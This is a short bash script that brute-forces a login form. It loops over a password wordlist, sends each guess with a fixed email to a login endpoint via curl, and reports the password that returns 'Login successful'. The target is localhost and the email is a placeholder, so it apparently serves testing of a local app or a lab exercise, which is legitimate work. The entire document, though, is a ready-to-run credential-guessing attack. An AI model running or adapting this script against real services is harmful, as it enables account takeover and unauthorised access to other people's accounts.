#!/bin/bash

EMAIL="user@example.com"
URL="http://localhost:3000/login"

while read -r password; do
  echo "Trying: $password"
  response=$(curl -s -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$EMAIL\", \"password\": \"$password\"}")

  echo "$response" | grep -q "Login successful"
  if [ $? -eq 0 ]; then
    echo "✅ Password found: $password"
    break
  fi
done < wordlist.txt
